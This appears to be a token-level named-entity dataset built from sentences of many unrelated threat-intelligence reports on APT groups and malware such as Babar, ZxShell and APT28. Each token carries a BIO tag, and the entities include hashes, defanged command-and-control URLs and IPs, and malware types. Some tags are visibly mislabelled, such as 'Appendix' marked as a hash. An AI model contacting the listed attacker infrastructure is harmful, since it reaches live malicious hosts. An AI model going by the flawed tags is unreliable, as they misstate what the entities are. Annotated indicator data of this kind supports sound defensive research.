actually	O
,	O
the	O
malware	O
turned	O
out	O
to	O
be	O
rather	O
simple	O
.	O

Other	O
attached	O
drives	O
or	O
removable	O
devices	O
may	O
also	O
be	O
targeted	O
.	O

(	O
Source	O
:	O
www.phishtank.com	B-url.unknown
)	O
CTU	O
researchers	O
observed	O
the	O
first	O
short	O
links	O
targeting	O
hillaryclinton.com	B-url.normal
email	O
addresses	O
being	O
created	O
in	O
midMarch	O
2016	O
;	O
the	O
last	O
link	O
was	O
created	O
in	O
mid-May	O
.	O

Babar	O
's	O
anti-analysis	O
measures	O
are	O
sparse	O
.	O

These	O
attacks	O
are	O
riskier	O
but	O
come	O
with	O
a	O
potentially	O
higher	O
reward	O
and	O
,	O
if	O
successful	O
,	O
could	O
give	O
the	O
attackers	O
access	O
to	O
a	O
vast	O
pool	O
of	O
potential	O
targets	O
.	O

After	O
selecting	O
the	O
port	O
,	O
the	O
server	O
variant	O
will	O
wait	O
for	O
incoming	O
connections	O
and	O
instruct	O
the	O
driver	O
to	O
redirect	O
appropriate	O
TCP	O
sessions	O
to	O
the	O
listening	O
port	O
.	O

The	O
config	O
file	O
has	O
either	O
a	O
'	O
.nfo	O
'	O
or	O
'	O
.cfg	O
'	O
extension	O
depending	O
on	O
the	O
version	O
.	O

appear	O
to	O
take	O
an	O
additional	O
parameter	O
while	O
files	O
that	O
end	O
in	O
-	O
require	O
a	O
full	O
file	O
path	O
.	O

2013-08-05	O
2013-08-04	O
2013-07-31	O
www.ndbssh.com	B-url.unknown
58.217.168.205	B-ip.unknown
www.ndbssh.com	B-url.unknown
222.95.171.178	B-ip.unknown
www.ndbssh.com	B-url.unknown
58.217.169.95	B-ip.unknown
CHINANET	O
JIANGSU	O
PROVINCE	O
NETWORK	O
CHINANET	O
JIANGSU	O
PROVINCE	O
NETWORK	O
CHINANET	O
JIANGSU	O
PROVINCE	O
NETWORK	O

It	O
points	O
towards	O
the	O
use	O
of	O
the	O
same	O
backend	O
infrastructure	O
,	O
designed	O
to	O
control	O
different	O
types	O
of	O
malware	O
.	O

In	O
other	O
words	O
,	O
trigger	O
a	O
false	O
positive	O
.	O

Mon	O
Feb	O
13	O
13:07:04	O
2012	O
(	O
UTC	O
)	O
Wed	O
Dec	O
28	O
13:23:04	O
2011	O
(	O
UTC	O
)	O
Thu	O
Jan	O
26	O
13:57:00	O
2012	O
(	O
UTC	O
)	O
E	O
:	O
\Visual	O
Studio	O
2010\Projects\Agent_NextGen\Agent2011v3\Agent2011\Agent\tasks\bin\	O
GetPasswords\exe\GetPasswords.pdb	O
D	O
:	O
\Projects\Agent2011\Agent2011\Agent\tasks\bin\systeminfo\exe\systeminfo.pdb	O
\\192.168.56.101\true\soft\Agent\tasks\Screenshots\agent_screeshots\Release\agent_	O
screeshots.pdb	O
•	O
00f67deb6e435c68f8a39336c9effc45d395b134	B-hash
•	O
01d3973e1bb46e2b75034736991c567862a11263	B-hash
•	O
034481acd945028f4521cf0eaa3685c6202f9e19	B-hash
•	O
04aefbf1527536159d72d20dea907cbd080793e3	B-hash
•	O
08facf0ae484f5bc7b066bbdd382e683fdfcba77	B-hash
•	O
0a38765d599865dabc394287e61f5e8f6ac442c5	B-hash
•	O
1051f814b33991a1f8e551759ead44b8ee7fc2c9	B-hash
•	O
1a3825ef1064c2bbea5169671ef62030b00875ca	B-hash
•	O
1d734a26184005603605aab67eba76d7d5ec3b8c	B-hash
•	O
1e02eea130d17b9afb712d846612ab8bd6972183	B-hash
•	O
210bc99275368df7ea179055737cffc3a12a6614	B-hash
•	O
23e20c523b9970686d913360d438c88e6067c157	B-hash
•	O
2564d7d42384bd3dce7257ef4a0a4b0cedac635b	B-hash
•	O
259b4679c26625c452141861014fe2f2c336462b	B-hash
•	O
26d030c93c517d63147f502bf6536c3914698821	B-hash
•	O
29686320a3f06030f7192ca5b4f3eb47e73cb470	B-hash
•	O
29a91e7823046f4ec3fd6b3fd1b442eaa92f3565	B-hash
•	O
31163d35c5a3caa5e82e1d9b0d1b4db8fbdd79fa	B-hash
•	O
32b0c8c46f8baaba0159967c5602f58dd73ebde9	B-hash
•	O
33beb7a410f1cd699733000b5b30b5e4eb2062ba	B-hash
•	O
3583647ef8158e29e3c18413ece70c2851720926	B-hash
•	O
365cbfe32a79ce41b049dd85bb30afc51ba1ea6f	B-hash
•	O
37144694cfa953ab7acd376c033beda45cc95f4d	B-hash
•	O
3a624b196576b03d327b43247a975da44688ffda	B-hash
•	O
3b297f0ca7750c0c74e5f931fec1528fe1ba6bc9	B-hash
•	O
3c8ba7ca3675ecc75855a58b9c0527d067c88f86	B-hash
•	O
3f0be1751afa9cb0fdd6bc6fc9874dd880bc8c1b	B-hash
•	O
41bb403d2549db95cfc6c851ef92ad26bdf2e906	B-hash
•	O
42cfe068b0f476198b93393840d400424fd77f0c	B-hash
•	O
42fadc443025a132f833a4a5ed8a5350f79a86cc	B-hash
•	O
43a979aa6ab08685d9ce949c67e19bebbb3c3559	B-hash
•	O
443bc2e77b10ae64af6321c2c7bfd311c0772503	B-hash
•	O
44406a80f13045442ce6a28ee62a923ac8f8c56a	B-hash
•	O
482d1624f9450ca1c99926ceec2606260e7ce544	B-hash
•	O
4975293c49ca223013088e51b8378e935322fe93	B-hash
•	O
49fb759d133eeaab3fcc78cec64418e44ed649ab	B-hash
•	O
4a16674c799fae6535c82f878f6a37f94ee9a49b	B-hash
•	O
5150174a4d5e5bb0bccc568e82dbb86406487510	B-hash
•	O
55bd71353408cdda1bdbbd54bc70b4c595d70e56	B-hash
•	O
56ac317ed78f8016d59cb41e9283b1c08cbf149f	B-hash
•	O
5bcd74e0c3c661580201e7d8122d7525a1480b4c	B-hash
•	O
5d3b82cdea4ae066efd5d127c7dd222adee62d0b	B-hash
•	O
5d4535df615a30b87b57facf4babf8d506e86a07	B-hash
•	O
5ffe420a3cc848024884db8e2cfed68c47368dae	B-hash
•	O
6502bffbd1324071c7461c50a2552e48084560ae	B-hash
•	O
662d3cb303450abae2b88699c7f48d74f84f0d5a	B-hash
•	O
669b7c98f0f697b91e95804dacdfe55fae3f0a85	B-hash
•	O
69c82f6ca382bd2205d55b89f2e842b4790bda62	B-hash
•	O
6b5ef7b76b35203dd323af49bfa27cfa7e1b6376	B-hash
•	O
6b64ed0f4e39a1c320c7cbd342a93faed9f5df86	B-hash
•	O
71c59eaa445346251467942bac489a9d4e807f7f	B-hash
•	O
75aeaee253b5c8ae701195e3b0f49308f3d1d932	B-hash
•	O
75e03a17d49d1b052770a21520bc13b14fc6c607	B-hash
•	O
7765a0869530c1a17b8fd339bbe55cc4c1bdba30	B-hash
•	O
78e9960cc5819583fb98fb619b33bff7768ee861	B-hash
•	O
7c710cf31f20ef7e0ad1809672255d4edfdff052	B-hash
•	O
7c79e3205323b9917f9eedcd3d5a891d87ddf256	B-hash
•	O
7cda99eefb5150b87278f9bcf6ac0bde534b99e8	B-hash
•	O
80935ac2ab3cf5b2900b49f6982a6a3f4575367c	B-hash
•	O
81affba765aa87a0d0b12b5a213f09fd51e1e9a1	B-hash
•	O
87668d14910c1e1bb8bbea0c6363f76e664dcd09	B-hash
•	O
883292f00e5836f99a1943a6e0164d8c6c124478	B-hash
•	O
8ad2003b99d92dfb9d85912ee6a39c46b1ec8137	B-hash
•	O
8b357ff017df3ed882b278d0dbbdf129235d123d	B-hash
•	O
8ba7932a40008881a4ed975f52271c0b679eaff2	B-hash
•	O
8bc2d5aa1f384d56f3e921bce5326de8ff4dce2d	B-hash
•	O
8c3ed0bbdc77aec299c77f666c21659840f5ce23	B-hash
•	O
8cc326473fd30ab5c97709e5a91fb04e18e72e96	B-hash
•	O
8f1ac45360196a7b5a1680ff839a131394e9d9b4	B-hash
•	O
8f467b32f1ec0f3b2efe10b3fed2a14b16075702	B-hash
•	O
9319bf72000f8e468c182947dd5c82fb8b9ae419	B-hash
•	O
93d53be2c3e7961bc01e0bfa5065a2390305268c	B-hash
•	O
93ee1c714fad9cc1bf2cba19f3de9d1e83c665e2	B-hash
•	O
94520b93510db0dc10387a65e0a46f45ab501226	B-hash
•	O
975b86c329c537f763f94a3f12610304dd358ff8	B-hash
•	O
9b56155b82f14000f0ec027f29ff20e6ae5205c2	B-hash
•	O
9dc6bbc34933ffecbfbb454788bab4230fcc2c65	B-hash
•	O
9e156f41ff9c17692c9eba5bdb67ac14f0c0473f	B-hash
•	O
9f8f1672594a6fbac43793c857dd7718e75f328a	B-hash
•	O
a38ea2533e3dfa6339726aafd4bc2bc7e3eec529	B-hash
•	O
a7a00f35797db2db9302625be456671911896d27	B-hash
•	O
a99d8313876015fcf1b783d38fee9e9c3cde088c	B-hash
•	O
ac2b5928f46069111f4334f650a7dbf1b5f026d5	B-hash
•	O
b26bc0a3e35c474f7099bd2b066f1680f3394b14	B-hash
•	O
b2b2e5c5a6f8a07f051aab14fbec1f6607888b50	B-hash
•	O
b47e711845d03c389004c912b3fbfc59228bb18c	B-hash
•	O
b5e973df0a159ab583fc8923c796c8cbf5b535df	B-hash
•	O
ba29768a2452a0e3abde02a903e53a181ee05bc8	B-hash
•	O
bdd2bae83c3bab9ba0c199492fe57e70c6425dd3	B-hash
•	O
bf265227f9a8e22ea1c0035ac4d2449ceed43e2b	B-hash
•	O
bf9d3a45273608caf90084c1157de2074322a230	B-hash
•	O
c02b8c2bc15dd8a7110e5f1765716464bf421591	B-hash
•	O
c117608dab3ab632de8110f8981dd7e773c61d05	B-hash
•	O
c3d8a548fa0525e1e55aa592e14303fc6964d28d	B-hash
•	O
c3fde950fe7d668805b40b1680d519f20c18b899	B-hash
•	O
c5ef4c31693845d492285e5f1c7ff3c293f99976	B-hash
•	O
c62e840ffe4bba50f6584b33a877475f0ebcf558	B-hash
•	O
c6472898e9085e563cd56baeb6b6e21928c5486d	B-hash
•	O
c7b91ff3cc69dab807016aa76d0c261411ccf27d	B-hash
•	O
c8fe2296565c211e019cdad3918a5736d4b12d44	B-hash
•	O
caa1083d2f20be0858e8d3d0671c042d0455a657	B-hash
•	O
cb7652aede9b1b7d756019f44c25fb0263498313	B-hash
•	O
ccf83cd713e0f078697f9e842a06d624f8b9757e	B-hash
•	O
ce9d077349638ffd3e1ad68cda76c12cfb024069	B-hash
•	O
cebcf2f495c3b95138128d0577dcac5cde29490d	B-hash
•	O
d12e4f164a4734e8136da85001750157014d012c	B-hash
•	O
d3254f1f4c4def8c023982dfb28fa31e91b69ab5	B-hash
•	O
d5cbf554e4e700b37ddcb026d4407fcd87032d87	B-hash
•	O
d89fc09f1aa72547d4b7f022470b6c8362997a5f	B-hash
•	O
daa651188610fd9c5a6987109e7ee5504d72a35d	B-hash
•	O
e0779ac6e5cc76e91fca71efeade2a5d7f099c80	B-hash
•	O
e2d0edf2e7d4a09fad732d4113d970a56e9a6667	B-hash
•	O
e76da232ec020d133530fdd52ffcc38b7c1d7662	B-hash
•	O
e99a03ebe3462d2399f1b819f48384f6714dcba1	B-hash
•	O
ea0cfe60a7b7168c42c0e86e15feb5b0c9674029	B-hash
•	O
eb851adfada7b40fc4f6c0ae348694500f878493	B-hash
•	O
efd41300ccf4143d04664715e1de98cb416ffdd1	B-hash
•	O
f2ffc4e1d5faec0b7c03a233524bb78e44f0e50b	B-hash
•	O
f33c980d4b6aaab1dc401226ab452ce840ad4f40	B-hash
•	O
f38040c70024fe9e305af5a3687e0d5993bb9e96	B-hash
•	O
f7693e5d39db067d97cd91fb22522f94c59fda3d	B-hash
•	O
f7d47c38eca7ec68aa478c06b1ba983d9bf02e15	B-hash
•	O
fb1b1dc288d68f695f88c5ac036b3ab1c4f5e850	B-hash
•	O
feb9424386af47d550b13614c78530bc06ec876e	B-hash

I	O
was	O
able	O
to	O
compile	O
a	O
custom	O
controller	O
from	O
the	O
source	O
code	O
for	O
the	O
purposes	O
of	O
testing	O
the	O
Ghost	O
Dragon	O
malware	O
.	O

The	O
server	O
will	O
acknowledge	O
the	O
handshake	O
by	O
sending	O
a	O
64	O
byte	O
random	O
buffer	O
with	O
the	O
same	O
pattern	O
for	O
the	O
3	O
and	O
8	O
DWORDs	O
based	O
on	O
the	O
new	O
,	O
randomly	O
generated	O
1	O
DWORD	O
(	O
offset	O
0	O
)	O
.	O

During	O
this	O
time	O
period	O
,	O
we	O
observed	O
the	O
following	O
domains	O
resolving	O
to	O
:	O
ph.moafee[.]com	B-url.unknown
afp.mozjlla[.]com	B-url.unknown
mofa.mozjlla[.]com	B-url.unknown
acer.moafee[.]com	B-url.unknown
del.moafee[.]com	B-url.unknown
jnt.moafee[.]com	B-url.unknown
pcg.moafee[.]com	B-url.unknown
sslc.moafee[.]com	B-url.unknown
at.moafee[.]com	B-url.unknown
lw.moafee[.]com	B-url.unknown
ks.moafee[.]com	B-url.unknown
oa.moafee[.]com	B-url.unknown
xxpp.moafee[.]com	B-url.unknown
hp.moafee[.]com	B-url.unknown
gumm.mozjlla[.]com	B-url.unknown
msn.moafee[.]com	B-url.unknown
During	O
this	O
same	O
time	O
frame	O
,	O
the	O
HTRAN	O
client	O
was	O
observed	O
attempting	O
to	O
connect	O
to	O
a	O
number	O
of	O
different	O
backend	O
HTRAN	O
servers	O
.	O

One	O
such	O
toolset	O
,	O
the	O
ScanBox	B-malware.infosteal
framework	O
,	O
is	O
now	O
shared	O
between	O
a	O
number	O
of	O
groups	O
who	O
conduct	O
espionage	O
attacks	O
.	O

checkDrives	O

If	O
the	O
list	O
does	O
not	O
contain	O
any	O
item	O
,	O
or	O
if	O
the	O
verification	O
has	O
failed	O
,	O
the	O
ZxShell	B-malware.backdoor
sample	O
tries	O
to	O
connect	O
to	O
a	O
hardcoded	O
host	O
with	O
the	O
goal	O
of	O
retrieving	O
a	O
new	O
updated	O
list	O
.	O

There	O
were	O
also	O
a	O
few	O
thousand	O
files	O
in	O
the	O
account	O
that	O
were	O
later	O
deleted	O
.	O

The	O
scripts	O
will	O
then	O
be	O
decoded	O
and	O
dropped	O
to	O
execute	O
the	O
payload	O
without	O
needing	O
to	O
Search	O
:	O

Figure	O
3	O
:	O
Cleaned	O
Script	O
Originally	O
by	O
JPCERT	O

sppsvc.exe	B-malware.unknown
:	O

Based	O
upon	O
some	O
cursory	O
analysis	O
the	O
backdoor	O
will	O
look	O
for	O
encrypted	O
commands	O
within	O
HTML	O
comments	O
returned	O
from	O
the	O
C2	O
using	O
the	O
following	O
format	O
:	O
however	O
,	O
the	O
C2	O
was	O
not	O
active	O
at	O
the	O
time	O
of	O
analysis	O
so	O
this	O
could	O
not	O
be	O
confirmed	O
.	O

Digital	O
signature/signing	O
date	O

38	O
The	O
statement	O
prompted	O
denials	O
from	O
the	O
Russian	O
Government	O
,	O
with	O
Russian	O
sports	O
minister	O
Vitaly	O
Mutko	O
asking	O
,	O
'	O
How	O
can	O
you	O
prove	O
that	O
the	O
hackers	O
are	O
Russian	O
?	O

The	O
attackers	O
spoofed	O
the	O
email	O
id	O
associated	O
with	O
a	O
Spain	O
based	O
equipment	O
manufacturing	O
company	O
Hidrofersa	O
which	O
specializes	O
in	O
designing	O
,	O
manufacturing	O
naval	O
,	O
industrial	O
and	O
mining	O
machinery	O
.	O

Include	O
the	O
JAR	O
reference	O
number	O
(	O
JAR-16-20296	O
A	O
)	O
in	O
the	O
subject	O
line	O
of	O
all	O
email	O
correspondence	O
.	O

It	O
is	O
possible	O
that	O
the	O
deployment	O
of	O
this	O
malware	O
infected	O
application	O
may	O
have	O
contributed	O
to	O
the	O
high-loss	O
nature	O
of	O
this	O
platform	O
.	O

For	O
instance	O
,	O
the	O
payload	O
checks	O
the	O
EAT	O
of	O
'	O
wininet.dll	O
'	O
using	O
the	O
comparisons	O
mentioned	O
above	O
to	O
find	O
the	O
address	O
to	O
the	O
'	O
DeleteUrlCacheEntryA	O
'	O
API	O
function	O
.	O

The	O
first	O
parameter	O
of	O
ZwContinue	O
is	O
a	O
pointer	O
to	O
the	O
CONTEXT	O
structure	O
.	O

2.3	O
.	O

B6C8A6D6C35428779C5C65C1B273EBA0	B-hash
menu.dyndns.biz	B-url.cncsvr
US	O

A	O
shortcut	B-malware.drop
file	O
(	O
.LNK	B-malware.drop
)	O
was	O
also	O
seen	O
in	O
the	O
.RAR	B-malware.drop
file	O
,	O
which	O
used	O
a	O
folder	O
icon	O
to	O
make	O
users	O
believe	O
it	O
was	O
another	O
folder	O
.	O

Babar	B-malware.drop
is	O
able	O
to	O
sniff	O
all	O
keystrokes	O
happening	O
on	O
the	O
same	O
desktop	O
as	O
its	O
invisible	O
window	O
.	O

After	O
compromising	O
a	O
victim	O
organization	O
,	O
APT28	B-malware.infosteal
will	O
steal	O
internal	O
data	O
that	O
is	O
then	O
leaked	O
to	O
further	O
political	O
narratives	O
aligned	O
with	O
Russian	O
interests	O
.	O

createDecryptPacket	O
:	O
]	O

Finally	O
,	O
it	O
completes	O
its	O
laborious	O
calculations	O
by	O
decrementing	O
EBX	O
by	O
one	O
,	O
yielding	O
a	O
final	O
answer	O
of	O
890	O
.	O

On	O
May	O
8	O
,	O
2018	O
President	O
Trump	O
announced	O
that	O
the	O
United	O
States	O
would	O
not	O
renew	O
the	O
waivers	O
on	O
sanctions	O
against	O
Iran	O
.	O

Clues	O
regarding	O
the	O
profiles	O
of	O
the	O
attackers	O
was	O
also	O
found	O
,	O
including	O
those	O
connected	O
to	O
developers	O
and	O
at	O
least	O
one	O
operator	O
.	O

Releasing	O
complete	O
IP	O
addresses	O
in	O
the	O
past	O
has	O
not	O
proved	O
useful	O
,	O
as	O
the	O
servers	O
are	O
quickly	O
shut	O
down	O
and	O
relocated	O
.	O

Remcom	O
:	O
An	O
open-source	O
alternative	O
to	O
PsExec	O
,	O
which	O
is	O
a	O
Microsoft	O
Sysinternals	O
tool	O
used	O
for	O
executing	O
processes	O
on	O
other	O
systems	O
.	O

A	O
few	O
months	O
ago	O
,	O
one	O
of	O
our	O
customers	O
contacted	O
us	O
regarding	O
strange	O
messages	O
he	O
received	O
on	O
Facebook	O
Messenger	O
.	O

Random	O
string	O
4	O
.	O

If	O
you	O
use	O
our	O
endpoint	O
protection	O
product	O
,	O
CylancePROTECT®	O
,	O
you	O
were	O
already	O
protected	O
from	O
this	O
attack	O
.	O

Instead	O
,	O
it	O
uses	O
one	O
of	O
the	O
recently	O
disclosed	O
code	O
execution	O
techniques	O
leveraging	O
INF	O
and	O
SCT	O
files	O
,	O
which	O
we	O
will	O
go	O
on	O
to	O
explain	O
later	O
in	O
the	O
blog	O
.	O

The	O
OceanLotus	O
group	O
,	O
also	O
known	O
as	O
APT32	O
and	O
APT-C-00	O
,	O
is	O
infamous	O
for	O
its	O
campaigns	O
targeting	O
the	O
eastern	O
part	O
of	O
Asia	O
.	O

The	O
process	O
is	O
detailed	O
below	O
:	O
1	O
.	O

Before	O
installing	O
itself	O
as	O
a	O
Windows	O
service	O
,	O
the	O
malware	O
checks	O
for	O
the	O
presence	O
of	O
either	O
360	O
Safe	O
Guard	O
or	O
360	O
Internet	O
Security	O
by	O
reading	O
following	O
registry	O
keys	O
:	O

DarkComet	B-malware.backdoor
has	O
been	O
studied	O
by	O
a	O
number	O
of	O
researchers	O
.	O

It	O
is	O
unlikely	O
that	O
CSRI	O
would	O
have	O
a	O
valid	O
business	O
interest	O
with	O
Spanish	O
government	O
departments	O
,	O
so	O
the	O
large	O
volume	O
of	O
data	O
transferred	O
between	O
the	O
two	O
networks	O
over	O
such	O
a	O
short	O
period	O
of	O
time	O
is	O
a	O
conspicuous	O
indicator	O
of	O
possibly	O
malicious	O
activity	O
.	O

Another	O
backdoor	O
used	O
an	O
otherwise	O
legitimate	O
DLL	O
filename	O
padded	O
with	O
a	O
non-printing	O
OS	O
command	O
control	O
code	O
.	O

Are	O
Patchwork	O
and	O
Confucius	O
the	O
same	O
group	O
?	O

index.asp	O
index.php	O
index.jsp	O
index.css	O
home.asp	O

©2013	O
by	O
Trend	O
Micro	O
,	O
Incorporated	O
.	O

This	O
presumably	O
gives	O
them	O
RDP	O
access	O
to	O
the	O
compromised	O
computer	O
.	O

The	O
HWP	O
file	O
format	O
is	O
similar	O
to	O
Microsoft	O
Word	O
documents	O
,	O
but	O
supported	O
by	O
Hangul	O
,	O
a	O
South	O
Korean	O
word	O
processing	O
application	O
from	O
the	O
Hancom	O
Office	O
bundle	O
.	O

Case	O
expansion	O
is	O
the	O
process	O
of	O
mapping	O
out	O
connections	O
with	O
other	O
cases	O
and	O
malwares	O
to	O
understand	O
the	O
larger	O
threat	O
picture	O
.	O

2017	O
.	O

Much	O
of	O
the	O
Crouching	B-malware.drop
Yeti	I-malware.drop
intrusions	O
were	O
enabled	O
by	O
trojanizing	O
legitimate	O
ICS-related	O
IT	O
software	O
installers	O
like	O
SCADA	O
environment	O
vpn	O
client	O
installers	O
and	O
industrial	O
camera	O
software	O
driver	O
installers	O
.	O

Exhibit	O
8	O
:	O
Maltego	O
Graph	O
Showing	O
Campaigns	O
Overlap	O

File	O
Name	O
:	O
b9af5f5fd434a65d7aa1b55f5441c90a.dll	O
File	O
Size	O
:	O
22016	O
bytes	O
MD5	O
:	O
b9af5f5fd434a65d7aa1b55f5441c90a	B-hash
SHA1	O
:	O
9b1e902103f7e23d915f4d01c84779e0bdca6995	B-hash
PE	O
Time	O
:	O
0x55372A7A	O
[	O
Wed	O
Apr	O
22	O
04:58:34	O
2015	O
UTC	O
]	O
PEID	O
Sig	O
:	O
Microsoft	O
Visual	O
C++	O
v6.0	O
DLL	O
Sections	O
(	O
4	O
)	O
:	O
Name	O
Entropy	O
MD5	O
.text	O
6.46	O
5c3d9bac10a06111e2bb1356bce6140a	B-hash
.rdata	O
4.64	O
76ae6bd3bce3f1fb9a86b9faac9b42be	B-hash
.data	O
0.0	O
bf619eac0cdf3f68d496ea9344137e8b	B-hash
.reloc	O
4.28	O
4e2b7dd08fa32594616a1d463e9b0975	B-hash

Indicates	O
error	O
copying	O
setup35.exe	O
Indicates	O
error	O
opening	O
AutoRun.inf	O
for	O
binary	O
write	O
Indicates	O
could	O
not	O
create	O
AutoRun.inf	O
Indicates	O
could	O
not	O
copy	O
netu3.dll/setup35.exe	O
'	O
!	O
Get	O
volume	O
path	O
=	O
%	O
s	O
'	O
'	O
!	O
Get	O
disk	O
memory	O
'	O

GetCurrentDirectoryA	O
(	O
0x400u	O
,	O
&	O
ret	O
>	O
message	O
)	O
)	O
>	O
command	O
=	O
GetLastError	O
(	O
)	O
;	O
FormatMessageA	O
(	O
0x1000u	O
,	O
0	O
,	O
>	O
command	O
,	O
0	O
,	O
&	O
ret	O
>	O
message	O
,	O
0x400u	O
,	O
0	O
)	O
;	O
>	O
len	O
+=	O
lstrlenA	O
(	O
&	O
ret	O
>	O
message	O
)	O
+	O
1	O
;	O
internet_connect	O
(	O
struct_this_7	O
*	O
)	O

Main	O
Threat	O
Vectors	O

Source	O
:	O
https://www.passivetotal.org/passive/192.52.167.118	B-url.normal
IP	O
address	O
204.152.203.99	B-ip.unknown
is	O
newer	O
and	O
has	O
been	O
in	O
use	O
since	O
May	O
:	O
Source	O
:	O
https://www.passivetotal.org/passive/204.152.203.99	B-url.normal
Below	O
are	O
the	O
active	O
IPs	O
used	O
for	O
command	O
and	O
control	O
or	O
for	O
delivery	O
:	O

As	O
we	O
wanted	O
to	O
use	O
Fiddler	O
to	O
get	O
a	O
better	O
understanding	O
on	O
the	O
network	O
activity	O
of	O
the	O
malware	O
,	O
we	O
manually	O
patched	O
the	O
routine	O
so	O
it	O
would	O
not	O
detect	O
the	O
Fiddler	O
mutex	O
.	O

The	O
code	O
of	O
this	O
module	O
is	O
loaded	O
directly	O
into	O
the	O
exploited	O
application	O
and	O
has	O
several	O
methods	O
of	O
payload	O
execution	O
.	O

August	O
2016	O
-	O
Black	O
Hat	O
USA	O
Table	O
of	O
Contents	O
Abstract	O
Operation	B-malware.ransom
Manul	I-malware.ransom
Victims	O
of	O
Operation	B-malware.ransom
Manul	I-malware.ransom
JRat	B-malware.backdoor
Malware	O
Family	O
JRat	B-malware.backdoor
Functionality	O
Anti-Analysis	O
Bandook	B-malware.unknown
Malware	O
Family	O
Core	O
Functionality	O
Network	O
Indicators	O
and	O
Modularity	O
Attribution	O
Observed	O
Links	O
to	O
the	O
Government	O
of	O
Kazakhstan	O
Observed	O
Links	O
to	O
Arcanum	O
Global	O
Intelligence	O
Observed	O
Links	O
To	O
Appin	O
Other	O
Possible	O
Targets	O
Conclusion	O
Acknowledgements	O
Appendix	B-hash
A	O
:	O
Indicators	O
of	O
Compromise	O
C2	O
Servers	O
Hashes	O
Appendix	B-url.normal
B	O
:	O
Further	O
Reading	O

The	O
malware	O
then	O
downloads	O
the	O
updated	O
executable	O
and	O
drops	O
it	O
in	O
the	O
%	O
Appdata	O
%	O
\SQLite	O
directory	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shots	O
.	O

The	O
following	O
SNORT	O
rules	O
have	O
been	O
released	O
by	O
the	O
Emerging	O
Threats	O
project	O
to	O
detected	O
the	O
fi	O
nal	O
payload	O
command	O
and	O
control	O
communications	O
.	O

Koadic	B-malware.unknown
's	O
communication	O
traffic	O

hxxp://104.237.218(.)67:80/icon.ico	B-url.cncsvr
6dc7bd14b93a647ebb1d2eccb752e750c4ab6b09	B-hash
hxxp://support.chatconnecting(.)com:80/icon.ico	B-url.cncsvr
c41972517f268e214d1d6c446ca75e795646c5f2	B-hash
hxxp://food.letsmiles(.)org/login.txt	B-url.cncsvr
9f95b81372eaf722a705d1f94a2632aad5b5c180	B-hash
hxxp://food.letsmiles(.)org/9niL	B-url.cncsvr
5B4459252A9E67D085C8B6AC47048B276C7A6700	B-hash
hxxp://23.227.196(.)210:80/logscreen.jpg	B-url.cncsvr
d8f31a78e1d158032f789290fa52ada6281c9a1f	B-hash
50fec977ee3bfb6ba88e5dd009b81f0cae73955e	I-hash
hxxp://45.114.117(.)137/eXYF	B-url.cncsvr
D1E3D0DDE443E9D294A39013C0D7261A411FF1C4	B-hash
91BD627C7B8A34AB334B5E929AF6F981FCEBF268	I-hash
hxxp://images.verginnet(.)info:80/ppap.png	B-url.cncsvr
F0A0FB4E005DD5982AF5CFD64D32C43DF79E1402	B-hash
hxxp://176.107.176(.)6/QVPh	B-url.cncsvr
8FC9D1DADF5CEF6CFE6996E4DA9E4AD3132702C	B-hash
hxxp://108.170.31(.)69/a	B-url.cncsvr
4a3f9e31dc6362ab9e632964caad984d1120a1a7	B-hash
hxxp://support(.)chatconnecting(.)com/pic.png	B-url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72	B-hash
hxxp://blog.versign(.)info/access/?version=4&lid=	B-url.cncsvr
[	I-url.cncsvr
reda	I-url.cncsvr
cted	I-url.cncsvr
]	I-url.cncsvr
&	I-url.cncsvr
token=	I-url.cncsvr
[	I-url.cncsvr
redacted	I-url.cncsvr
]	O
9e3971a2df15f5d9eb21d5da5a197e763c035f7a	B-hash
hxxp://23.227.196(.)210/6tz8	B-url.cncsvr
bb82f02026cf515eab2cc88faa7d18148f424f72	B-hash
hxxp://23.227.196(.)210/QVPh	B-url.cncsvr
8fc9d1dadf5cef6cfe6996e4da9e4ad3132702c5	B-hash
hxxp://45.114.117(.)137/3mkQ	B-url.cncsvr
91bd627c7b8a34ab334b5e929af6f981fcebf268	B-hash
hxxp://176.223.111(.)116:80/download/sido.jpg	B-url.cncsvr
5934262D2258E4F23E2079DB953DBEBED8F07981	B-hash
hxxp://110.10.179(.)65:80/ptF2	B-url.cncsvr
DA2B3FF680A25FFB0DD4F55615168516222DFC10	B-hash
hxxp://110.10.179(.)65:80/download/microsoftp.jpg	B-url.cncsvr
23EF081AF79E92C1FBA8B5E622025B821981C145	B-hash
hxxp://110.10.179(.)65:80/download/microsoft.jpg	B-url.cncsvr
C845F3AF0A2B7E034CE43658276AF3B3E402EB7B	B-hash
hxxp://27.102.70(.)211:80/image.jpg	B-url.cncsvr
9394B5EF0B8216528CED1FEE589F3ED0E88C7155	B-hash

Eleven	O
of	O
the	O
links	O
were	O
clicked	O
once	O
,	O
four	O
were	O
clicked	O
twice	O
,	O
two	O
were	O
clicked	O
three	O
times	O
,	O
and	O
two	O
were	O
clicked	O
four	O
times	O
.	O

Figure	O
9	O
-	O
Registry	O
Entrenchment	O
Entry	O
The	O
RAT	B-malware.backdoor
Installer	O
also	O
sets	O
the	O
entrenchment/persistence	O
mechanism	O
for	O
the	O
payload	O
malware	O
.	O

varc=newSystem.Diagnostics.ProcessStartInfo	O
(	O
System.Text.Encoding.GetEn-coding	O
(	O
65001	O
)	O
.	O

Map	O
of	O
top	O
affected	O
countries	O
by	O
targeted	O
attacks	O
Sectors	O
affected	O
by	O
targeted	O
attacks	O

The	O
VBS	O
script	O
acts	O
as	O
a	O
downloader	O
for	O
further	O
malicious	O
payloads	O
from	O
a	O
distribution	O
server	O
,	O
as	O
shown	O
in	O
the	O
diagram	O
below	O
.	O

Pasting	O
Bitly	O
URLs	O
,	O
appended	O
with	O
a	O
plus	O
sign	O
,	O
into	O
the	O
address	O
bar	O
of	O
a	O
web	O
browser	O
reveals	O
the	O
full	O
URL	O
.	O

Ultimately	O
this	O
PowerShell	O
implant	O
will	O
be	O
set	O
to	O
automatically	O
start	O
daily	O
at	O
2	O
am	O
via	O
a	O
scheduled	O
task	O
(	O
shown	O
below	O
)	O
.	O

This	O
prevents	O
easy	O
detection	O
by	O
MD5	O
or	O
signatures	O
of	O
the	O
second	O
stage	O
payload	O
.	O

Trojan/Win32.MSShell	B-malware.infosteal
ab.exe	B-malware.drop
44BCF2DD262F12222ADEAB6F59B2975B	B-hash
72.0	O
KB	O
(	O
73,802	O
bytes	O
)	O
BinExecute/Microsoft.EXE	O
[	O
:	O
X86	O
]	O
2009-05-10	O
07:02:12	O
Unknown	O
Microsoft	O
Visual	O
